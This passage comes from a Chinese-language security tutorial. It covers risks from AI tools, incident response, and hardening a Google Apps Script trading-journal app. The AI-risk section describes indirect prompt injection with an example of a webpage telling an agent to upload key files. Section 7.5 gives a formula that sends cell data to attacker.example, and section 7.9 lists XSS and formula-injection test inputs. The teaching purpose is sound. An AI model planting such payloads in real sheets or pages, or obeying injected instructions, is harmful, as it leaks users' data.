+<div class="table-wrap"><table><thead><tr><th>風險</th><th>例子</th><th>防禦</th></tr></thead><tbody><tr><td>直接提示注入</td><td>使用者要求模型忽略規則</td><td>真正的權限檢查放在模型外</td></tr><tr><td>間接提示注入</td><td>網頁、Email 或文件中藏有給 AI 的指令</td><td>把外部內容當資料，重要操作要人工確認</td></tr><tr><td>權限過大</td><td>AI 代理能刪檔、發信或推送程式碼</td><td>只開必要工具，保留人工核准</td></tr><tr><td>資料外傳</td><td>模型輸出夾帶敏感資料的連結或圖片</td><td>限制對外連線，檢查輸出</td></tr><tr><td>不安全的輸出處理</td><td>把模型回答直接放進 HTML 或 SQL</td><td>模型輸出也視為不可信輸入</td></tr><tr><td>金鑰暴露</td><td>把 API 金鑰放在前端</td><td>金鑰只放後端</td></tr><tr><td>敏感資料外流</td><td>把密碼或客戶資料貼進對話</td><td>先遮罩，並確認資料使用政策</td></tr></tbody></table></div>
+<p>危險組合是以下三者同時存在：能讀私人資料、會接觸不可信內容、能對外傳送資料。只要拿掉其中一項，風險就會大幅下降。</p>
+<p><strong>間接注入例子：</strong> 你請 AI 代理摘要一個網頁，網頁裡藏了一行白色文字，要求它把本機的金鑰檔上傳到某個網址。若代理有讀檔和連網權限，又沒有人工確認，這段文字就可能造成實際傷害。</p>
+<h3 id="55-如何安全地用-ai-寫程式">5.5 如何安全地用 AI 寫程式</h3>
+<p>AI 能大幅加快開發，但生成的程式碼也可能包含漏洞。</p>
+<ol><li><p><strong>明確提出安全需求：</strong> 例如「只有我能存取、要驗證 CSV 欄位、防公式注入」。</p>
+</li><li><p><strong>逐段看懂再採用：</strong> 看不懂的部分要先問清楚。</p>
+</li><li><p><strong>查證套件：</strong> AI 提到的套件名稱和 API 都可能不存在。</p>
+</li><li><p><strong>審查差異：</strong> 特別注意權限檢查、資料拼接、對外連線和金鑰處理。</p>
+</li><li><p><strong>實際測試：</strong> 用第 4 課的方法攻擊看看，不要只看它能不能動。</p>
+</li><li><p><strong>限制 AI 工具權限：</strong> 謹慎核准刪除、推送和外部請求。不要把密碼、Token 或驗證碼貼給 AI。</p>
+</li><li><p><strong>讓 AI 用不同角度審查：</strong> 可以請它扮演攻擊者找問題，但仍要親自確認，它也可能漏掉問題或判斷錯誤。</p>
+</li></ol>
+<h3 id="實作檢查你的工具鏈">實作：檢查你的工具鏈</h3>
+<ul><li class="task"><label><input type="checkbox" data-task="13"><span>列出瀏覽器擴充功能，移除不用或來源不明的項目</span></label></li><li class="task"><label><input type="checkbox" data-task="14"><span>查看 AI 工具已連接哪些服務，移除用不到的權限</span></label></li><li class="task"><label><input type="checkbox" data-task="15"><span>檢查 GitHub 已授權的應用程式</span></label></li><li class="task"><label><input type="checkbox" data-task="16"><span>新專案啟用 Dependabot、Secret Scanning 和 Push Protection（依帳號方案與 repo 類型，功能可能不同）</span></label></li><li class="task"><label><input type="checkbox" data-task="17"><span>對現有 Python 專案執行一次 <code>pip-audit</code>，並理解輸出的意思</span></label></li></ul>
+<p><strong>完成標準：</strong> 你能說出每個擴充功能和 AI 連接器為什麼需要存在。</p>
+<h3 id="自我測驗-4">自我測驗</h3>
+<ol><li><p><code>npm audit</code> 沒有回報問題，就代表套件安全嗎？</p>
+</li><li><p>為什麼 AI 代理讀到的網頁內容也算不可信輸入？</p>
+</li><li><p>哪三項能力同時存在時，AI 代理的資料外洩風險特別高？</p>
+</li></ol>
+<h2 id="第-6-課-偵測與事件應變">第 6 課 偵測與事件應變</h2>
+<p>防守不可能永遠成功，所以要先準備好三件事：能發現異常、能恢復資料、知道出事時按什麼順序處理。</p>
+<h3 id="61-日誌該記什麼">6.1 日誌該記什麼</h3>
+<div class="table-wrap"><table><thead><tr><th>應該記錄</th><th>不應該記錄</th></tr></thead><tbody><tr><td>登入成功與失敗</td><td>密碼、驗證碼</td></tr><tr><td>權限遭拒絕</td><td>API 金鑰、Token、Cookie</td></tr><tr><td>資料寫入、刪除的時間與筆數</td><td>完整的機密資料內容</td></tr><tr><td>上傳檔案的大小、結果與驗證錯誤</td><td>上傳檔案的完整內容</td></tr><tr><td>重要設定變更</td><td>完整信用卡或證件號碼</td></tr></tbody></table></div>
+<p>日誌也是攻擊目標，所以要限制存取權限。使用者輸入寫進日誌前也要處理換行字元，避免偵造紀錄。</p>
+<h3 id="62-哪些跡象代表可能被入侵">6.2 哪些跡象代表可能被入侵</h3>
+<div class="table-wrap"><table><thead><tr><th>地方</th><th>要注意的跡象</th></tr></thead><tbody><tr><td>Email</td><td>出現不認得的轉寄規則、篩選器、密碼重設信</td></tr><tr><td>Google 帳號</td><td>陌生裝置、陌生第三方應用程式、復原資料遭修改</td></tr><tr><td>雲端硬碟</td><td>大量檔案被修改、分享權限變更</td></tr><tr><td>GitHub</td><td>陌生 commit、新增 SSH 金鑰或 Token、Actions 異常執行</td></tr><tr><td>交易帳戶</td><td>不是你下的單、出金資訊或聯絡資料變動</td></tr><tr><td>電腦</td><td>不認得的啟動項目、防毒遭關閉、瀏覽器多了擴充功能</td></tr><tr><td>自己的專案</td><td>工作表突然出現不認得的資料、公式或大量錯誤</td></tr></tbody></table></div>
+<h3 id="63-備份最後一道防線">6.3 備份：最後一道防線</h3>
+<p>常見原則是 3-2-1：至少 3 份資料、存在 2 種不同媒介、其中 1 份放在異地。</p>
+<ul><li><p><strong>備份要能抵抗帳號被盜：</strong> 同一個 Google 帳號裡的副本，會和原檔一起被刪。至少定期在離線位置保存一份。</p>
+</li><li><p><strong>備份要分版本：</strong> 才能在資料已被污染時，回到污染前的狀態。</p>
+</li><li><p><strong>備份要實際還原過：</strong> 沒測試過的備份，不算可靠。</p>
+</li><li><p><strong>備份也是敏感資料：</strong> 同樣要控管存取權限，必要時加密。</p>
+</li></ul>
+<p>Google Sheets 的版本記錄很方便，但它和工作表在同一個帳號系統內，所以不能完全取代離線備份。</p>
+<h3 id="64-事件應變六步驟">6.4 事件應變六步驟</h3>
+<ol><li><p><strong>發現與判斷：</strong> 先寫下時間和看到的現象，盡量保持冷靜。</p>
+</li><li><p><strong>止血：</strong> 從乾淨裝置改密碼、撕銷 Token、登出所有工作階段，必要時中斷中毒裝置的網路。</p>
+</li><li><p><strong>保留證據：</strong> 截圖、存下可疑信件和登入紀錄，不要急著全部刪除。</p>
+</li><li><p><strong>清除：</strong> 移除攻擊者留下的轉寄規則、OAuth 授權、SSH 金鑰、惡意程式。</p>
+</li><li><p><strong>恢復：</strong> 用已知乾淨的備份或版本還原，並確認資料正確。</p>
+</li><li><p><strong>檢討：</strong> 寫下根本原因，補上防護，避免同樣的事再發生。</p>
+</li></ol>
+<p>如果電腦可能已中毒，<strong>不要在同一台電腦上改密碼</strong>，因為新密碼也可能被偷走。請改用另一台乾淨裝置。</p>
+<h3 id="65-常見事件的處理清單">6.5 常見事件的處理清單</h3>
+<p><strong>Google 帳號被盜：</strong></p>
+<ol><li><p>用乾淨裝置進入 <a href="https://myaccount.google.com/security" target="_blank" rel="noopener">Google 帳戶安全性</a>，改密碼。無法登入時使用 <a href="https://accounts.google.com/signin/recovery" target="_blank" rel="noopener">Google 帳戶復原</a>。</p>
+</li><li><p>登出不認得的裝置。</p>
+</li><li><p>檢查復原電子郵件、復原電話、兩步驟驗證方式和通行金鑰。</p>
+</li><li><p>移除不認得的第三方存取權限。</p>
+</li><li><p>檢查 Gmail 轉寄與篩選器。</p>
+</li><li><p>檢查 Drive 的分享設定和異常活動。</p>
+</li><li><p>更改使用同一個 Email 註冊的重要帳號密碼，先從交易平台、GitHub 和密碼管理器開始。</p>
+</li></ol>
+<p><strong>GitHub Token 或金鑰外洩：</strong></p>
+<ol><li><p>立刻撕銷，再產生新的。</p>
+</li><li><p>查看 GitHub 安全紀錄和 repo 活動，找出外洩期間的異常操作。</p>
+</li><li><p>檢查 commit、Actions、Webhook、Deploy Key 和協作者是否有變動。</p>
+</li><li><p>找出外洩原因。若必要，再清理 Git 歷史。</p>
+</li></ol>
+<p><strong>交易帳戶有異常：</strong></p>
+<ol><li><p>用手動輸入的官方網址登入，不要使用信件連結。</p>
+</li><li><p>視需要處理倉位與排定委託，並修改密碼。</p>
+</li><li><p>立即透過平台官方客服回報，並保留截圖與紀錄。</p>
+</li><li><p>檢查 Email 是否也被入侵。</p>
+</li></ol>
+<p>無法自行判斷或已經有財務損失時，請儘快聯繫平台客服。在台灣也可撥打 165 反詐騙專線詢問，或向警方報案。</p>
+<p><strong>電腦可能中毒：</strong></p>
+<ol><li><p>中斷電腦網路，改用乾淨裝置處理帳號。</p>
+</li><li><p>從最重要的帳號開始改密碼，並登出所有工作階段。</p>
+</li><li><p>撕銷那台電腦上的 Token 和 SSH 金鑰。</p>
+</li><li><p>執行完整掃毒。若無法確定已清除，備份必要資料後重灣系統最可靠。不要還原來源不明的執行檔。</p>
+</li></ol>
+<h3 id="實作做一次小型演練">實作：做一次小型演練</h3>
+<ul><li class="task"><label><input type="checkbox" data-task="18"><span>在離線位置寫下你的重要帳號清單與處理順序（不要寫密碼）</span></label></li><li class="task"><label><input type="checkbox" data-task="19"><span>確認備援碼和備用裝置真的拿得到</span></label></li><li class="task"><label><input type="checkbox" data-task="20"><span>將交易日誌工作表匯出到離線位置保存</span></label></li><li class="task"><label><input type="checkbox" data-task="21"><span>建立一份測試副本，刪掉幾列資料，再用版本記錄還原</span></label></li><li class="task"><label><input type="checkbox" data-task="22"><span>模擬「假設現在 Email 被盜」，計時走一次清單，但不實際變更設定</span></label></li></ul>
+<p><strong>完成標準：</strong> 在不查網路的情況下，你能說出帳號被盜時的前五步。</p>
+<h3 id="自我測驗-5">自我測驗</h3>
+<ol><li><p>為什麼懷疑電腦中毒時，不該用同一台電腦改密碼？</p>
+</li><li><p>為什麼同一個帳號裡的副本，不能完全當備份？</p>
+</li><li><p>為什麼日誌不能記錄 Token？</p>
+</li></ol>
+<h2 id="第-7-課-實戰替-你的專案-做防護">第 7 課 實戰：替你的專案做防護</h2>
+<p>你的專案還沒開始寫，這是最好的時機：只要把存取權限設成「只有自己」，就能先排除大部分外部攻擊。其餘風險集中在帳號、CSV 內容和 GitHub。</p>
+<p>這一課根據目前的規劃：用 Google Apps Script（GAS）做網頁應用程式，匯入交易平台 CSV，填寫人工欄位後寫入 Google 工作表。實際寫法改變時，要重新檢查。</p>
+<figure><svg viewBox="0 0 760 334" role="img" aria-label="資料跨過信任邊界時要檢查，Google 帳號則要最優先保護" font-size="13"><defs><marker id="trust-arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="var(--muted)"/></marker></defs><text x="24" y="30" font-size="15" font-weight="600" fill="var(--ink)">資料跨過信任邊界時要檢查，Google 帳號則要最優先保護</text><g fill="none" stroke="var(--muted)" stroke-width="1.25"><path d="M174 120H204" marker-end="url(#trust-arrow)"/><path d="M354 120H400" marker-end="url(#trust-arrow)"/><path d="M550 120H586" marker-end="url(#trust-arrow)"/><path d="M204 268H174" marker-end="url(#trust-arrow)"/><path d="M354 268H475V174" marker-end="url(#trust-arrow)"/><path d="M661 226V174" marker-end="url(#trust-arrow)"/></g><g><line x1="377" x2="377" y1="66" y2="182" stroke="var(--accent)" stroke-width="2" stroke-dasharray="6 4"/><text x="377" y="200" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--ink)">信任邊界</text></g><g><rect x="24" y="66" width="150" height="108" rx="8" fill="none" fill-opacity="1" stroke="var(--muted)" stroke-width="1.25"/><text x="36" y="90" font-weight="600" fill="var(--ink)">不可信的輸入</text><text x="36" y="114" font-size="11.5" fill="var(--ink)">交易平台 CSV</text><text x="36" y="132" font-size="11.5" fill="var(--ink)">手動筆記</text></g><g><rect x="204" y="66" width="150" height="108" rx="8" fill="none" fill-opacity="1" stroke="var(--muted)" stroke-width="1.25"/><text x="216" y="90" font-weight="600" fill="var(--ink)">瀏覽器前端</text><text x="216" y="114" font-size="11.5" fill="var(--ink)">用 textContent</text><text x="216" y="132" font-size="11.5" fill="var(--ink)">顯示資料</text></g><g><rect x="400" y="66" width="150" height="108" rx="8" fill="none" fill-opacity="1" stroke="var(--muted)" stroke-width="1.25"/><text x="412" y="90" font-weight="600" fill="var(--ink)">GAS 後端</text><text x="412" y="114" font-size="11.5" fill="var(--ink)">requireOwner_</text><text x="412" y="132" font-size="11.5" fill="var(--ink)">驗證 CSV 欄位</text><text x="412" y="150" font-size="11.5" fill="var(--ink)">safeText_ 防公式</text></g><g><rect x="586" y="66" width="150" height="108" rx="8" fill="none" fill-opacity="1" stroke="var(--muted)" stroke-width="1.25"/><text x="598" y="90" font-weight="600" fill="var(--ink)">Google 工作表</text><text x="598" y="114" font-size="11.5" fill="var(--ink)">限制分享</text><text x="598" y="132" font-size="11.5" fill="var(--ink)">定期離線備份</text></g><g><rect x="24" y="226" width="150" height="84" rx="8" fill="none" fill-opacity="1" stroke="var(--muted)" stroke-width="1.25"/><text x="36" y="250" font-weight="600" fill="var(--ink)">GitHub</text><text x="36" y="272" font-size="11.5" fill="var(--ink)">Private repo</text><text x="36" y="290" font-size="11.5" fill="var(--ink)">不放憑證與 CSV</text></g><g><rect x="204" y="226" width="150" height="84" rx="8" fill="none" fill-opacity="1" stroke="var(--muted)" stroke-width="1.25"/><text x="216" y="250" font-weight="600" fill="var(--ink)">開發電腦</text><text x="216" y="272" font-size="11.5" fill="var(--ink)">保持系統更新</text><text x="216" y="290" font-size="11.5" fill="var(--ink)">不裝可疑軟體</text></g><g><rect x="520" y="226" width="216" height="84" rx="8" fill="var(--accent)" fill-opacity="0.12" stroke="var(--accent)" stroke-width="2"/><text x="532" y="250" font-weight="600" fill="var(--ink)">Google 帳號</text><text x="532" y="272" font-size="11.5" fill="var(--ink)">被盜時可越過全部防線</text><text x="532" y="290" font-size="11.5" fill="var(--ink)">所以最優先保護</text></g><text x="377" y="58" text-anchor="middle" font-size="11.5" fill="var(--muted)">google.script.run</text><text x="568" y="112" text-anchor="middle" font-size="11.5" fill="var(--muted)">寫入</text><text x="483" y="205" font-size="11.5" fill="var(--muted)">clasp 部署</text><text x="189" y="216" text-anchor="middle" font-size="11.5" fill="var(--muted)">git push</text><text x="669" y="205" font-size="11.5" fill="var(--muted)">擁有</text></svg><figcaption>專案的資料流與信任邊界</figcaption></figure>
+<p>虛線左側的內容都能被改動，所以真正的檢查要放在右側的 GAS 後端。</p>
+<h3 id="71-風險排序">7.1 風險排序</h3>
+<div class="table-wrap"><table><thead><tr><th>優先</th><th>風險</th><th>攻擊情境</th><th>防護</th></tr></thead><tbody><tr><td>1</td><td>Google 帳號被盜</td><td>釣魚後直接取得所有資料與程式</td><td>第 2 課的帳號防護</td></tr><tr><td>2</td><td>網頁應用程式權限設錯</td><td>外人拿到網址後，以你的權限寫入</td><td>存取權限設為 <code>MYSELF</code></td></tr><tr><td>3</td><td>GitHub 外洩</td><td>交易資料、帳戶名稱或憑證被提交</td><td>Private repo、.gitignore、gitleaks</td></tr><tr><td>4</td><td>公式注入</td><td>CSV 或筆記的文字被當成公式，並對外傳送資料</td><td>文字欄位轉義、數字欄位嚴格解析</td></tr><tr><td>5</td><td>XSS</td><td>筆記或 CSV 內容在頁面上被當成程式執行</td><td><code>textContent</code>、不用 <code>&lt;?!= ?&gt;</code></td></tr><tr><td>6</td><td>工作表分享太寬</td><td>知道連結的人都能讀取</td><td>限制分享對象</td></tr><tr><td>7</td><td>授權範圍太大</td><td>程式出問題時，可碰到所有工作表</td><td>最小授權範圍</td></tr><tr><td>8</td><td>壞資料或重複匯入</td><td>錯誤 CSV 污染或重複寫入工作表</td><td>欄位驗證、以 Id 去重、備份</td></tr></tbody></table></div>
+<h3 id="72-部署設定最重要的一步">7.2 部署設定：最重要的一步</h3>
+<p>GAS 的權限由「以誰的身分執行」和「誰能存取」共同決定。<a href="https://developers.google.com/apps-script/manifest/web-app-api-executable" target="_blank" rel="noopener">Google 的設定值</a>如下。</p>
+<div class="table-wrap"><table><thead><tr><th>設定</th><th>意思</th><th>對你的專案的建議</th></tr></thead><tbody><tr><td><code>access: MYSELF</code></td><td>只有部署者能存取</td><td><strong>使用這個</strong></td></tr><tr><td><code>access: DOMAIN</code></td><td>同網域的人可存取</td><td>不需要</td></tr><tr><td><code>access: ANYONE</code></td><td>任何已登入的使用者可存取</td><td>不要用</td></tr><tr><td><code>access: ANYONE_ANONYMOUS</code></td><td>完全公開，不必登入</td><td>絕對不要用</td></tr><tr><td><code>executeAs: USER_DEPLOYING</code></td><td>以部署者身分執行</td><td>有 <code>MYSELF</code> 時可使用</td></tr><tr><td><code>executeAs: USER_ACCESSING</code></td><td>以訪客身分執行</td><td>未來多人使用時再評估</td></tr></tbody></table></div>
+<p><strong>危險組合：</strong> <code>USER_DEPLOYING</code> 加 <code>ANYONE</code> 或 <code>ANYONE_ANONYMOUS</code>。這等於讓其他人透過網址使用你的 Google 權限。網址很長不代表安全。</p>
+<p><code>appsscript.json</code> 範例：</p>
+<pre><code class="language-json">{
+  &quot;timeZone&quot;: &quot;Asia/Taipei&quot;,
+  &quot;runtimeVersion&quot;: &quot;V8&quot;,
+  &quot;exceptionLogging&quot;: &quot;STACKDRIVER&quot;,
+  &quot;webapp&quot;: {
+    &quot;executeAs&quot;: &quot;USER_DEPLOYING&quot;,
+    &quot;access&quot;: &quot;MYSELF&quot;
+  },
+  &quot;oauthScopes&quot;: [
+    &quot;https://www.googleapis.com/auth/spreadsheets.currentonly&quot;,
+    &quot;https://www.googleapis.com/auth/userinfo.email&quot;
+  ]
+}</code></pre>
+<p><strong>授權範圍要實測：</strong> <a href="https://developers.google.com/apps-script/concepts/scopes" target="_blank" rel="noopener">Google 建議</a>使用最小的範圍。如果使用附屬在工作表上的程式，請先測試這組設定能否正常寫入。若必須改用 <code>openById()</code>，就需要較大的 <code>spreadsheets</code> 範圍，此時請只開啟固定的工作表 ID，不要由前端傳入。</p>
+<p>附屬工作表的程式也可以在檔案頂端加上 <a href="https://developers.google.com/apps-script/guides/services/authorization" target="_blank" rel="noopener"><code>@OnlyCurrentDoc</code></a>，限制只要求目前檔案的存取權。</p>
+<p>部署時還要注意：</p>
+<ul><li><p>沒有用到就不要寫 <code>doPost</code>，也不要建立沒有用途的公開端點。</p>
+</li><li><p>程式修改後會產生新版本，請到部署管理頁面封存不再使用的舊部署。</p>
+</li><li><p>除非必要，不要呼叫 <code>setXFrameOptionsMode(ALLOWALL)</code>。<a href="https://developers.google.com/apps-script/reference/html/html-output" target="_blank" rel="noopener">Google 說明</a>這會允許任何網站嵌入頁面，需要自行防護點擊劫持。</p>
+</li></ul>
+<h3 id="73-前端能呼叫哪些後端函式">7.3 前端能呼叫哪些後端函式</h3>
+<p><a href="https://developers.google.com/apps-script/guides/html/communication" target="_blank" rel="noopener"><code>google.script.run</code></a> 可以呼叫任何頂層的公開函式。函式名稱以底線結尾才是私有的，前端無法呼叫。</p>
+<p>這代表每個沒有底線的函式，都是一個 API 入口，而且參數全部不可信。</p>
+<pre><code class="language-javascript">// 公開：前端可以呼叫，必須自己做完整檢查
+function importTrades(csvText) {
+  requireOwner_();
+  const trades = parseTradesCsv_(csvText);
+  return writeNewTrades_(trades);
+}
+
+// 私有：名稱結尾有底線，前端不能呼叫
+function writeNewTrades_(trades) {
+  // 留給你實作：以 Id 去重後寫入工作表
+}</code></pre>
+<p>即使已設定 <code>MYSELF</code>，仍可以再加一道檢查。出錯或取不到 Email 時，預設拒絕：</p>
+<pre><code class="language-javascript">function requireOwner_() {
+  const owner = PropertiesService.getScriptProperties().getProperty(&#39;OWNER_EMAIL&#39;);
+  const current = Session.getActiveUser().getEmail();
+  if (!owner || current !== owner) {
+    throw new Error(&#39;沒有權限&#39;);
+  }
+}</code></pre>
+<h3 id="74-解析-csv嚴格驗證">7.4 解析 CSV：嚴格驗證</h3>
+<p>CSV 即使是你自己下載的，也要當成不可信輸入。檔案可能選錯、格式可能改版，或內容可能已被其他程式改過。</p>
+<p>你的 <code>trades_export.csv</code> 目前有這些欄位，其中檔案開頭有 BOM 字元，解析前要先移除：</p>
+<pre><code class="language-text">Id,ContractName,EnteredAt,ExitedAt,EntryPrice,ExitPrice,Fees,PnL,Size,Type,TradeDay,TradeDuration,Commissions</code></pre>
+<p>另外，<code>orders_export.csv</code> 含有 <code>AccountName</code>。除非功能真的需要，否則不要寫入工作表或日誌，這就是資料最小化。</p>
+<pre><code class="language-javascript">const MAX_CSV_CHARS = 2000000;
+const MAX_ROWS = 10000;
+const REQUIRED_COLUMNS = [&#39;Id&#39;, &#39;ContractName&#39;, &#39;EnteredAt&#39;, &#39;ExitedAt&#39;,
+  &#39;EntryPrice&#39;, &#39;ExitPrice&#39;, &#39;Fees&#39;, &#39;PnL&#39;, &#39;Size&#39;, &#39;Type&#39;];
+
+function parseTradesCsv_(csvText) {
+  if (typeof csvText !== &#39;string&#39; || csvText.length &gt; MAX_CSV_CHARS) {
+    throw new Error(&#39;檔案格式或大小不合法&#39;);
+  }
+  const rows = Utilities.parseCsv(csvText.replace(/^﻿/, &#39;&#39;));
+  if (rows.length &lt; 2 || rows.length &gt; MAX_ROWS) {
+    throw new Error(&#39;資料列數不合法&#39;);
+  }
+
+  const header = rows[0];
+  const missing = REQUIRED_COLUMNS.filter(name =&gt; !header.includes(name));
+  if (missing.length &gt; 0) {
+    throw new Error(&#39;缺少欄位：&#39; + missing.join(&#39;, &#39;));
+  }
+
+  const col = name =&gt; header.indexOf(name);
+  return rows.slice(1).map(row =&gt; ({
+    id: requireInteger_(row[col(&#39;Id&#39;)], &#39;Id&#39;),
+    contract: safeText_(row[col(&#39;ContractName&#39;)], 20),
+    entryPrice: requireNumber_(row[col(&#39;EntryPrice&#39;)], 0, 1000000, &#39;EntryPrice&#39;),
+    exitPrice: requireNumber_(row[col(&#39;ExitPrice&#39;)], 0, 1000000, &#39;ExitPrice&#39;),
+    pnl: requireNumber_(row[col(&#39;PnL&#39;)], -1000000, 1000000, &#39;PnL&#39;),
+    size: requireNumber_(row[col(&#39;Size&#39;)], 1, 1000, &#39;Size&#39;),
+    side: requireOneOf_(row[col(&#39;Type&#39;)], [&#39;Long&#39;, &#39;Short&#39;], &#39;Type&#39;)
+  }));
+}</code></pre>
+<p>上限數字是範例，請依你的實際資料調整。其他時間欄位請用同樣方式解析，並拒絕無效日期。</p>
+<h3 id="75-公式注入試算表的特有風險">7.5 公式注入：試算表的特有風險</h3>
+<p>工作表內容不只是資料，也可能是公式。請想像一個儲存格寫入了這段文字：</p>
+<pre><code class="language-text">=IMAGE(&quot;https://attacker.example/x.png?data=&quot;&amp;A1)</code></pre>
+<p>如果它被當成公式，圖片網址就會帶上 A1 的內容，等於把資料傳給攻擊者。<a href="https://community.owasp.org/attacks/CSV_Injection" target="_blank" rel="noopener">OWASP CSV Injection</a> 指出，<code>=</code>、<code>+</code>、<code>-</code>、<code>@</code>、Tab 和換行都可能觸發，全形符號在部分環境也有風險。它也提醒沒有一種過濾方式適用所有試算表軟體，所以最後一定要實測。</p>
+<p>防禦分兩種欄位：</p>
+<ul><li><p><strong>數字欄位：</strong> 解析成真正的數字再寫入，因此合法的負損益不會被誤判。</p>
+</li><li><p><strong>文字欄位：</strong> 若以危險字元開頭，就在前面加上單引號，讓試算表當成文字。</p>
+</li></ul>
+<pre><code class="language-javascript">function safeText_(value, maxLength) {
+  const text = String(value == null ? &#39;&#39; : value).slice(0, maxLength);
+  return /^[\s﻿]*[=+\-@＝＋－＠]/.test(text) ? &quot;&#39;&quot; + text : text;
+}
+
+function requireNumber_(value, min, max, name) {
+  const text = String(value).trim();
+  if (!/^-?\d+(\.\d+)?$/.test(text)) throw new Error(name + &#39; 格式不合法&#39;);
+  const number = Number(text);
+  if (number &lt; min || number &gt; max) throw new Error(name + &#39; 超出範圍&#39;);
+  return number;
+}
+
+function requireInteger_(value, name) {
+  const text = String(value).trim();
+  if (!/^\d{1,18}$/.test(text)) throw new Error(name + &#39; 格式不合法&#39;);
+  return text;
+}
+
+function requireOneOf_(value, allowed, name) {
+  if (!allowed.includes(value)) throw new Error(name + &#39; 不在允許清單內&#39;);
+  return value;
+}</code></pre>
+<p><code>safeText_</code> 和 <code>requireNumber_</code> 我已用 Node.js 測試常見攻擊輸入。但它們還沒有在真正的 GAS 與 Google 工作表中執行過，所以請務必做 7.9 的攻擊測試。</p>
+<p><code>requireInteger_</code> 會回傳字串，是為了避免很長的 Id 在轉成數字時失去精度。人工填寫的筆記欄位同樣要經過 <code>safeText_</code>。如果有功能會把工作表資料讀出來再寫入或匯出，也要再次檢查。</p>
+<h3 id="76-頁面顯示防-xss">7.6 頁面顯示：防 XSS</h3>
+<p>GAS 的 HTML 範本有兩種輸出語法，<a href="https://developers.google.com/apps-script/guides/html/templates" target="_blank" rel="noopener">官方建議</a>預設使用會自動編碼的那一種。</p>
+<div class="table-wrap"><table><thead><tr><th>語法</th><th>行為</th><th>使用時機</th></tr></thead><tbody><tr><td><code>&lt;?= value ?&gt;</code></td><td>依位置自動編碼</td><td>預設使用</td></tr><tr><td><code>&lt;?!= value ?&gt;</code></td><td>原樣輸出，不編碼</td><td>只用於完全受你控制的內容，絕不用於使用者資料</td></tr></tbody></table></div>
+<p>前端用 JavaScript 顯示資料時，也要避免 <code>innerHTML</code>：</p>
+<pre><code class="language-javascript">function addCell(row, value) {
+  const cell = document.createElement(&#39;td&#39;);
+  cell.textContent = value; // 不管內容是什麼，都只當文字
+  row.appendChild(cell);
+}</code></pre>
+<h3 id="77-github-與資料外洩">7.7 GitHub 與資料外洩</h3>
+<ul><li><p>Repo 預設設為 Private。如果要公開，請先建立乾淨的新 repo，不要直接公開原本的歷史。</p>
+</li><li><p>先建立 <code>.gitignore</code>，再進行第一次提交。</p>
+</li><li><p><code>.clasprc.json</code> 是 clasp 的登入憑證，絕對不能提交。<code>.clasp.json</code> 包含 script ID，公開 repo 也建議排除。</p>
+</li><li><p>不要提交實際 CSV、交易截圖、帳戶名稱或工作表 ID。</p>
+</li><li><p>測試資料請用假資料。</p>
+</li><li><p>每次推送前，先執行 <code>git status</code> 和 <code>gitleaks git -v .</code>。</p>
+</li></ul>
+<pre><code class="language-text">.env
+.env.*
+!.env.example
+.clasprc.json
+.clasp.json
+*.csv
+*.xlsx
+screenshots/</code></pre>
+<h3 id="78-google-工作表與分享">7.8 Google 工作表與分享</h3>
+<ul><li><p>工作表一般存取權設為「限制」，並檢查共用名單。</p>
+</li><li><p>不分享整份工作表，改分享去除敏感資訊的報表或副本。</p>
+</li><li><p>交易截圖分享前，先遮住帳戶名稱和其他識別資訊。</p>
+</li><li><p>在 <a href="https://myaccount.google.com/connections" target="_blank" rel="noopener">Google 帳戶的第三方連結頁面</a>，定期確認你的專案授權範圍是否合理。</p>
+</li></ul>
+<h3 id="79-攻擊你自己的-你的專案">7.9 攻擊你自己的專案</h3>
+<p>你的專案完成後，請在<strong>你自己的部署和測試工作表</strong>上逐項測試，並把結果填入表格。不要先在正式工作表上測。</p>
+<div class="table-wrap"><table><thead><tr><th>測試</th><th>做法</th><th>預期結果</th><th>實測結果</th></tr></thead><tbody><tr><td>外人存取</td><td>用無痕視窗開啟網址</td><td>要求登入或拒絕存取</td><td></td></tr><tr><td>其他帳號</td><td>用另一個 Google 帳號開啟</td><td>拒絕存取</td><td></td></tr><tr><td>私有函式</td><td>在瀏覽器 Console 選擇應用程式框架，嘗試呼叫 <code>google.script.run.writeNewTrades_([])</code></td><td>失敗</td><td></td></tr><tr><td>簡單公式</td><td>筆記填入 <code>=1+1</code></td><td>顯示文字，不是 2</td><td></td></tr><tr><td>外連公式</td><td>筆記填入 <code>=IMAGE(&quot;https://example.com/a.png&quot;)</code></td><td>顯示文字，不載入圖片</td><td></td></tr><tr><td>變形公式</td><td>筆記先加空白或 Tab，再填公式</td><td>顯示文字</td><td></td></tr><tr><td>XSS</td><td>筆記填入 <code>&lt;img src=x onerror=alert(1)&gt;</code></td><td>原樣顯示文字，沒有提示框</td><td></td></tr><tr><td>錯誤欄位</td><td>上傳缺少欄位的 CSV</td><td>整批拒絕，工作表不變</td><td></td></tr><tr><td>錯誤數字</td><td>把 <code>Size</code> 改成 <code>-1</code>、<code>abc</code>、<code>1e5</code></td><td>整批拒絕</td><td></td></tr><tr><td>不在清單內</td><td>把 <code>Type</code> 改成 <code>Buy</code></td><td>整批拒絕</td><td></td></tr><tr><td>上傳公式</td><td>把 <code>ContractName</code> 改成 <code>=1+1</code></td><td>拒絕或顯示為文字</td><td></td></tr><tr><td>超大檔案</td><td>上傳超過上限的檔案</td><td>清楚拒絕，不寫入</td><td></td></tr><tr><td>重複上傳</td><td>同一個 CSV 上傳兩次</td><td>不產生重複資料</td><td></td></tr><tr><td>錯誤訊息</td><td>觸發上述錯誤</td><td>不顯示堆疊或機密資料</td><td></td></tr><tr><td>密鑰掃描</td><td>執行 <code>gitleaks git -v .</code></td><td>沒有發現，或已逐一確認誤報</td><td></td></tr><tr><td>還原</td><td>用版本記錄還原測試工作表</td><td>資料恢復正確</td><td></td></tr></tbody></table></div>
+<h3 id="710-實作順序">7.10 實作順序</h3>
+<ol><li><p>先完成第 2 課的帳號防護。</p>
+</li><li><p>建立 Private repo 和 <code>.gitignore</code>，再掃描一次。</p>
+</li><li><p>建立測試工作表，不要直接使用正式工作表。</p>
+</li><li><p>設定 <code>MYSELF</code>，先部署一個空頁面，測試其他帳號是否進得來。</p>
+</li><li><p>實作 CSV 驗證，再實作工作表寫入。</p>
+</li><li><p>執行 7.9 的攻擊測試，修正全部失敗項目。</p>
+</li><li><p>備份正式工作表，再切換正式資料。</p>
+</li></ol>
+<p><strong>完成標準：</strong> 7.9 全部項目都符合預期結果，而且你能說明每個防護擋下了哪種攻擊。</p>
